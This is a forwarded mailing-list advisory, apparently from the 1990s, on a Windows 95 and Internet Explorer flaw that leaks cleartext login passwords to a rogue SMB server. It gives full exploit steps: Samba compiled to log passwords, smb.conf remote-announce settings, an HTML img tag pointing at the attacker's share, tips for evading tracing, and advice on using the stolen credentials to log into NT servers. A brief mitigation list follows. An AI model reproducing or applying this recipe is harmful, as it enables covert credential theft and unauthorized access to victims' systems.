I forward this because of the discussion of SecureFile and M$ CryptoAPI, 
which relies on the security of the windows password to protect keys.
Fun...

                       WINDOWS 95 AND MSIE SECURITY HOLE

What's new

   It is possible from anywhere on the Internet to obtain the cleartext
   Windows 95 login password from a Windows 95 computer on a network
   connected directly to the Internet given only the IP address and the
   workgroup and leave no trace of your actions. It is untested and may
   work with Windows For Workgroups as well.

Description



   There has been recent discussion on security mailing lists concerning
   the fact that Microsoft Internet Explorer running on Windows NT will
   automatically try to log in to a remote SMB server (file server)
   without prompting the user or without the user's knowledge. By
design,
   the NT machine will transmit to this remote server the encrypted
   password and username of the user. This is documented by Aaron
   Spangler. The caveats with this are that the passwords are encrypted
   and that in many cases people do not use WWW browsers from NT
servers,
   but rather from computers running Windows 95.

   It has been explained that this same exploit does not work against
   Windows 95 because Windows 95 is only capable of accessing SMB shares
   (file sharing) if they are:
     * Connected to the same subnet.
     * In the Windows 95 computer's LMHOSTS file on startup
     * Announced to the Windows 95 computer by a Master Browser



   It is this third and final condition that can be taken advantage of
to
   obtain the cleartext password and username of any Windows 95 user who
   uses Microsoft Internet Explorer. Even careless use of Microsoft
   Network Neighborhood can exploit this hole without the requirement
   for Internet Explorer The requirements are knowledge of the user's IP
   address, workgroup name and that they access a hostile web page. The
   first two are not difficult to obtain and the third does not have to
   be an obscure page. In the last 6 months sites such as the CIA have
   been broken into. All it would require is that one un-noticeable line
   be added to the home page. Since the viewable content of the page has
   not been altered, such a change can go unnoticed for a long time.

The Exploit



   This involves the use of the Unix SMB implementation called Samba.
   There are no source changes required, but it should be compiled with
   -DDEBUG_PASSWORD.
   Samba has an option in the smb.cfg file called remote announce. This
   allows you to specify a network address (host or broadcast) and
   workgroup name to inform about your existence. I have configured the
   [global] section of the smb.conf file like this:

   workgroup = EXPLOIT
   preferred master = yes
   domain master = yes
   security = user
   debug level = 100
   remote announce = 10.0.0.255/WORKGROUP




   The only thing that must be changed is the remote announce line. The
   rest works as-is. A simple share must then be set up such as:

[exploit]
   path = /tmp
   public = no
   browsable = yes




   Nothing needs to be in the directory as nobody will ever see it. For
   the sake of untractability, change your hostname to something that
   does not exist, but ensure to create an entry for it in /etc/hosts.
   This makes your host untraceable unless the network you are
connecting
   to monitors network traffic.

   Run smbd. If you are running it from inetd, the process must at least
   start itself in order to send the broadcast. Using smbclient to
browse
   yourself is enough for this. The broadcast gets sent regardless of
   what smbd was started for.

   At this point if anyone on the target network were to look at their
   Windows 95 Network Neighborhood they would see the host "EXPLOIT".
The
   host is now vulnerable to your attack. While this step may seem a bit
   obscure and complicated, the truth is that it is very simple. I won't
   get into details here, but the methods for obtaining the workgroup
   name are easy to use and readily available. Finding a target network
   that has not protected ports 137 and 139 is also not so hard. Once
   you've done that, setting everything up to here takes a very short
   ammount of time.

   The final and easiest step is to include the following in any html
   file a user on this network accesses:
   &lt;img src=file://\\exploit/exploit/t.gif&gt;

   Congratulations!!! You will now see in your Samba log a line such as
   this:
   checking user=[user] pass=[INNOCENT]

What does this all mean?



   The password of any Internet-connected user running Microsoft
Internet
   Explorer on Windows 95 obtained be found in cleartext provided that
   their network administrator has not protected them from accessing
   external SMB servers by closing ports 139 and 137. If you have
   obtained the password of a user of a Windows NT server, you can now
   take the username, password and workgroup and log into that Windows
NT
   server. Your true hostname and IP address are not stored in the html
   file and I am aware of no logging of hosts that enter the browse
list.
   This means that you are not traceable, even though they are
connecting
   to your machine. If you are lucky, you found the Windows 95 machine
of
   the NT administrator and have little work left in order to access the
   NT server with administrator privileges.

Solutions


     * Use Netscape
     * Use a proxy firewall or packet filter to close off ports 137 and
       139 from external access to your network, though this still
leaves
       you at risk from internal attacks.
     * Ask Microsoft to rewrite Windows to not send passwords by
default.

Demonstration

   We're working on software that will allow anyone to try this out and
   hope to have it finished tomorrow.
